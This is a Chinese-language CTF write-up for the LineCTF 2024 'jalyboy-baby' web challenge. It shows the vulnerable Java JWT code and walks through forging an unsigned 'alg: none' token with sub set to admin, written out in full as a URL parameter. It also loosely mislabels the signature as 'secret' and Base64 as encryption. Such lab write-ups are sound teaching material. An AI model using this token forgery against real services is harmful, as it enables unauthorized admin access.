---
title: ( LineCTF 2024 ) jalyboy-baby
published: 2024-08-08
description: ''
image: ''
tags: [Writeup, CTF, Web]
category: 'WriteUps'
draft: false 
---

# jalyboy-baby ( Write Up )

原始碼：
```java
public class JwtController {

    public static final String ADMIN = "admin";
    public static final String GUEST = "guest";
    public static final String UNKNOWN = "unknown";
    public static final String FLAG = System.getenv("FLAG");
    Key secretKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);

    @GetMapping("/")
    public String index(@RequestParam(required = false) String j, Model model) {
        String sub = UNKNOWN;
        String jwt_guest = Jwts.builder().setSubject(GUEST).signWith(secretKey).compact();

        try {
            Jwt jwt = Jwts.parser().setSigningKey(secretKey).parse(j);
            Claims claims = (Claims) jwt.getBody();
            if (claims.getSubject().equals(ADMIN)) {
                sub = ADMIN;
            } else if (claims.getSubject().equals(GUEST)) {
                sub = GUEST;
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }

        model.addAttribute("jwt", jwt_guest);
        model.addAttribute("sub", sub);
        if (sub.equals(ADMIN)) model.addAttribute("flag", FLAG);

        return "index";
    }
}
```

```html
<!DOCTYPE html>
<html>
<head>
    <title>LINECTF2024 | jalyboy-baby</title>
    <style>
    <!-- 省略 -->
    </style>
</head>
<body class="light">
    <div class="center">
        <h1>LINECTF2024 | jalyboy-baby</h1>
        <h2>Hi ${sub}!</h2>
        <#if flag?has_content>
            <p>flag is <code>${flag} &#x1f389;</code></p>
        </#if>
        <div>
            <a href="/?j=${jwt}" class="button">login as guest</a>
            <a class="button disabled">login as admin</a>
        </div>
    </div>
</body>
</html>
```
---
### ❓ JWT ( Json Web Token )
JWT 分成三個部分


**Header**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
**Payload**
```json
{
  "sub": "admin",
  "iat": 1422779638
}
```
**Signature**
```
HMAC_SHA256(
  base64urlEncoding(header) + '.' +
  base64urlEncoding(payload),
  secret
)
```

最後將三個部分使用 Base64url 加密組成 Token
```javascript
const token = base64urlEncoding(header) + '.' + base64urlEncoding(payload) + '.' + base64urlEncoding(signature)
```

補充資料：[JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token)

---

### 🔻 Step. 1
- 點擊 `login as guest` 後，觀察到封包內出現
`j=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.rUKzvxAwpuro6UF6KETwbMPCLBsPGUScjSEZtQGjfX4`
- 依據原始碼的資訊，判斷出後面的代碼為 JWT 加密後的字串

![image](https://hackmd.io/_uploads/SkepqDYn0a.png)

---


### 🔻 Step. 2

- 根據 `header.payload.secret` 的格式，將三段分別切成
> header = `eyJhbGciOiJIUzI1NiJ9`
> payload = `eyJzdWIiOiJndWVzdCJ9`
> secret = `rUKzvxAwpuro6UF6KETwbMPCLBsPGUScjSEZtQGjfX4`
- *secret* 是由 *header* 與 *payload* 使用 [HS256](https://zh.wikipedia.org/wiki/SHA%E5%AE%B6%E6%97%8F) 雜湊後的字串

:::warning
### 雜湊函式 Hash Function
- 由雜湊值是無法反推出原來的訊息
- 雜湊值必須隨明文改變而改變。

補充資源 : [雜湊 (Hash)](https://ithelp.ithome.com.tw/articles/10208884)

:::

---

### 🔻 Step. 3
- 使用 jwt.io 的工具，得到以下資訊
> header = `{"alg": "HS256"}`
> payload = `{"sub": "guest"}`
- 根據原始碼，最終需要獲得 *secret* 並把 `sub` 改為 admin
    - 雜湊值是不可逆的，所以在此無法取得 key
    - 換個思路，讓程式在讀取 *secret* 時繞過雜湊函式
    - *secret* 的雜湊函式是根據 *header* 的 `alg`，將 `alg` 改為 none 即可
    -    故最後修改為：
> header = `{"alg": "none"}`
> payload = `{"sub": "admin"}`

![image](https://hackmd.io/_uploads/BJLzhKhC6.png)

---
### 🔻 Step. 4
- 使用 Base64 加密工具，取得以下資訊
> header = `eyJhbGciOiAibm9uZSJ9`
> payload = `eyJzdWIiOiAiYWRtaW4ifQ`
- 重新組成 `eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4ifQ.`
- 修改封包或網址 `?j=eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4ifQ.`

![image](https://hackmd.io/_uploads/B1lw19hCT.png)

---

### 🔅 其他參考資料
> 解題關鍵：[JWT利用在ctfhub-easy_login拿到flag](https://blog.csdn.net/weixin_60719780/article/details/129344197)
>
> 基礎原理：[JWT(JSON Web Token) — 原理介紹](https://medium.com/%E4%BC%81%E9%B5%9D%E4%B9%9F%E6%87%82%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88/jwt-json-web-token-%E5%8E%9F%E7%90%86%E4%BB%8B%E7%B4%B9-74abfafad7ba)
>
> 工具應用：[jwt.io](https://jwt.io/)

Tag: `CTF` `LINECTF 2024` `JWT` `Json Web Token` `Write Up`